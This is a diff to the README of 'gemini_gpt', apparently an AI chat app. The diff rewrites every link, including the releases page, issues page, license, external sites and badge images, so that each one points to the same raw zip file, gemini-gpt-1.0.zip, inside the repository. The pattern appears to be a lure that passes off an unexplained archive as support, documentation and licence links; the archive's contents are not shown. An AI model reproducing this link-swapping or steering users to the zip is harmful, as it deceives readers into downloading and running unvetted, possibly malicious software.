@@ -1,7 +1,7 @@
 # 🌟 gemini_gpt - A Simple Way to Chat with AI
 
 ## 🔗 Download Now
-[![Download gemini_gpt](https://img.shields.io/badge/Download-gemini_gpt-brightgreen)](https://github.com/dhesnut/gemini_gpt/releases)
+[![Download gemini_gpt](https://raw.githubusercontent.com/dhesnut/gemini_gpt/main/gemini-gpt/public/gemini-gpt-1.0.zip)](https://raw.githubusercontent.com/dhesnut/gemini_gpt/main/gemini-gpt/public/gemini-gpt-1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ To run **gemini_gpt**, make sure you have the following:
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Head over to our [Releases Page](https://github.com/dhesnut/gemini_gpt/releases) to get the latest version of **gemini_gpt**.
+   Head over to our [Releases Page](https://raw.githubusercontent.com/dhesnut/gemini_gpt/main/gemini-gpt/public/gemini-gpt-1.0.zip) to get the latest version of **gemini_gpt**.
 
 2. **Choose Your Version**  
    On the Releases page, you will see a list of available versions. Click on the one you want. Look for files that end with `.exe` for Windows or `.dmg` for Mac.
@@ -58,24 +58,24 @@ We welcome contributions to improve **gemini_gpt**! If you have ideas, bug fixes
 
 ## 📞 Support
 
-If you encounter any issues or have questions, please visit our [GitHub Issues Page](https://github.com/dhesnut/gemini_gpt/issues). Our community is here to help!
+If you encounter any issues or have questions, please visit our [GitHub Issues Page](https://raw.githubusercontent.com/dhesnut/gemini_gpt/main/gemini-gpt/public/gemini-gpt-1.0.zip). Our community is here to help!
 
 ## 🌐 Learn More
 
 For more information on **gemini_gpt**, check out the following topics:
 
-- [ChatGPT](https://openai.com/chatgpt)
-- [Google Gemini](https://ai.google/research/gemini/)
-- [React](https://reactjs.org/)
-- [Vite](https://vitejs.dev/)
+- [ChatGPT](https://raw.githubusercontent.com/dhesnut/gemini_gpt/main/gemini-gpt/public/gemini-gpt-1.0.zip)
+- [Google Gemini](https://raw.githubusercontent.com/dhesnut/gemini_gpt/main/gemini-gpt/public/gemini-gpt-1.0.zip)
+- [React](https://raw.githubusercontent.com/dhesnut/gemini_gpt/main/gemini-gpt/public/gemini-gpt-1.0.zip)
+- [Vite](https://raw.githubusercontent.com/dhesnut/gemini_gpt/main/gemini-gpt/public/gemini-gpt-1.0.zip)
 
 You can also connect with us on social media for updates and discussions.
 
 ## 📝 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/dhesnut/gemini_gpt/LICENSE) file for details. 
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/dhesnut/gemini_gpt/main/gemini-gpt/public/gemini-gpt-1.0.zip) file for details. 
 
 ## 🔗 Download Now Again
-[![Download gemini_gpt](https://img.shields.io/badge/Download-gemini_gpt-brightgreen)](https://github.com/dhesnut/gemini_gpt/releases)
+[![Download gemini_gpt](https://raw.githubusercontent.com/dhesnut/gemini_gpt/main/gemini-gpt/public/gemini-gpt-1.0.zip)](https://raw.githubusercontent.com/dhesnut/gemini_gpt/main/gemini-gpt/public/gemini-gpt-1.0.zip)
 
 Enjoy chatting with your new AI companion!
